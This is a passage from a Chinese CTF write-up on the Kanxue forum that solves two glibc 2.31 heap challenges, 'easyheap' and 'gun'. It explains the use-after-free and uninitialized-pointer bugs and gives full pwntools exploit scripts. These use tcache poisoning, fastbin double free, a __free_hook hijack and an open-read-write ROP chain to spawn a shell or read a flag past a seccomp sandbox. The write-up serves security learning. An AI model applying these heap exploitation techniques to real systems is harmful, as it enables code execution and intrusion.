
```python
from pwn import *
from pwnlib.util.iters import mbruteforce
from hashlib import sha256
import base64
context.log_level='debug'
context.arch = 'amd64'
context.os = 'linux'
r=process('./easyheap')
libc=ELF('./libc-2.31.so')
def z():
    gdb.attach(r)
def cho(num):
    r.sendlineafter(">> ",str(num))
def exadd(v2,size,con):
    cho(1)
    r.sendlineafter("Size: ",str(v2))
    r.sendlineafter("Size: ",str(size))
    r.sendlineafter("Content: ",con)
def add(size,con):
    cho(1)
    r.sendlineafter("Size: ",str(size))
    r.sendlineafter("Content: ",con)
def show(index):
    cho(2)
    r.sendlineafter("Index: ",str(index))
def delet(index):
    cho(3)
    r.sendlineafter("Index: ",str(index))
##leak libc
for i in range(0,8):
    add(0x80,'nameless')
for i in range(0,7):
    delet(7-i)
delet(0)
exadd(0x100,1,'\x60') #0
show(0)
r.recvuntil("Content: ")
libcbase=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x1c4bad-(libc.sym['__libc_start_main']+243)
log.success('libcbase:'+hex(libcbase))
##set
free_hook=libcbase+libc.sym['__free_hook']
system=libcbase+libc.sym['system']
##tcache poison
##exadd(0x2d1,0x80,'nameless')
delet(0)
for i in range(0,8):
    add(0x70,'nameless')
for i in range(0,8):
    delet(i)
for i in range(0,7):
    add(0x60,'/bin/sh\x00')
delet(1)
delet(5)
delet(4)
delet(3)
delet(2)
exadd(0xe1,0x60,'nameless')
add(0x60,p64(free_hook))
add(0x60,'nameless')
add(0x60,'nameless')
add(0x60,p64(system))
delet(0)
r.interactive()
```

## 2.gun

![img](https://bbs.kanxue.com/upload/attach/202204/943085_UNAGR8MATDC84SJ.jpg)

这题还挺有意思的，不得不佩服出题人的脑洞，也挺好玩的

### 保护

![img](https://bbs.kanxue.com/upload/attach/202204/943085_VY9AJQU6VPW6NE4.jpg)

### 沙箱

![img](https://bbs.kanxue.com/upload/attach/202204/943085_85BJ4FZZ2TYM7HT.jpg)

禁了`system`和`execve`的系统调用，不能使用`one_gadget`直接打，考虑`orw`绕过

### ida

![img](https://bbs.kanxue.com/upload/attach/202204/943085_KAAEK6S4FMQPFQ5.jpg)

前面就读了一个名字还有禁了一下沙箱，主要还是从这里开始看，从`menu`里面可以看出主要实现了3个功能。这三个功能和平常的管理系统都不大一样。

#### shoot

![img](https://bbs.kanxue.com/upload/attach/202204/943085_N9KU2MRNKAPQMZE.jpg)

有个`printf`函数可以让我们`leak` `libc`和`heap`

`free`之后没有清空指针，多半可以`uaf`进行`double free`

#### load

![img](https://bbs.kanxue.com/upload/attach/202204/943085_CYGPG6GE5S9974K.jpg)

发现在`clip`处挂了一个头插法插入的链表，由于`shoot`的时候没有断链，所以实际上可能是把一条一条的链拼接上去。如果我们挂的链上有一个`free`过的堆块，连续`shoot`至那个堆块就可`double free`了

#### buy

![img](https://bbs.kanxue.com/upload/attach/202204/943085_T45E6ZPEQW9T6BS.jpg)

申请后指针未初始化，可以利用这个`leak` `libc`和`heap`

### 利用思路

`double free`劫持`free_hook`然后堆上`rop`的裸题

### exp

```python
from pwn import *
context.update(arch='amd64', os='linux', log_level='debug')
r=process('./gun')
libc=ELF('./libc-2.31.so')
def z():
    gdb.attach(r)
def cho(num):
    r.sendlineafter("Action> ",str(num))
def buy(size,con):
    cho(3)
    r.sendlineafter("Bullet price: ",str(size))
    r.sendlineafter("Bullet Name: ",con)
def load(index):
    cho(2)
    r.sendlineafter('load?',str(index))
def shoot(time):
    cho(1)
    r.sendlineafter('time: ',str(time))
##read_name
r.sendlineafter("Your name: ",'nameless')
##leak_libc
buy(0x500,'nameless') #0
buy(0x20,'nameless') #1
load(0)
shoot(1)
buy(0x20,'nameless')#0
load(0)
shoot(1)
r.recvuntil('Pwn! The ')
r.recvuntil('nameless')
libcbase=u64(r.recv(6).ljust(8,'\x00'))-0x1c4f5d-(libc.sym['__libc_start_main']+243)
log.success('libcbase:'+hex(libcbase))
##set libfunc
setcontext=libcbase+libc.sym['setcontext']+61
free_hook=libcbase+libc.sym['__free_hook']
pdt=libcbase+0x26b72 ##pop_rdi_ret
pat=libcbase+0x4a550 ##pop_rax_ret
pst=libcbase+0x27529 ##pop_rsi_ret
pd12t=libcbase+0x11c1e1 ##pop_rdx_r12_ret
sys_ret=libcbase+0x66229 ##syscall_ret
def syscall(num,a1,a2,a3):
    pd=p64(pat)+p64(num)+p64(pdt)+p64(a1)+p64(pst)+p64(a2)+p64(pd12t)+p64(a3)+p64(0)+p64(sys_ret)
    return pd
##leak_heap
buy(0x30,'nameless') #0
buy(0x30,'nameless') #2
load(0)
load(2)
shoot(2)
buy(0x30,'\x0a') #0
load(0)
shoot(1)
r.recvuntil('Pwn! The ')
heap=u64(r.recv(6).ljust(8,'\x00'))-0x340
log.success('heap:'+hex(heap))
##set target
target=heap+0x4c0
##fastbin_double_free
load(1)
shoot(1)
for i in range(0,9):
    buy(0x20,'nameless')
for i in range(0,9):
    load(8-i)
    shoot(9)
for i in range(0,7):
    buy(0x20,'nameless')
for i in range(0,6):
    load(5-i)
    shoot(8)
##free_hook to setcontext
for i in range(0,7):
    buy(0x20,'nameless')
rop=syscall(2,target+0x10,0,0)+syscall(0,3,target+0x10,0x40)+syscall(1,1,target+0x10,0x40)
padding='./flag\x00\x00'+p64(target)+p64(setcontext)+'a'*0x78+p64(target+0xb0)+rop
buy(0x200,padding)
buy(0x20,p64(free_hook))
buy(0x20,'nameless')
buy(0x20,'nameless')
buy(0x20,p64(libcbase+0x1547a0)) ## 特殊的gadget
load(7)
z()
shoot(1)
r.recvuntil('flag')
flag='flag'+r.recv()
print(flag)
r.interactive()
```

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2022-5-1 21:54

被Nameless_a编辑，原因：

上传的附件：

- [gun](javascript:void(0);)
  （14.13kb，9次下载）
- [easyheap](javascript:void(0);)
  （13.98kb，5次下载）
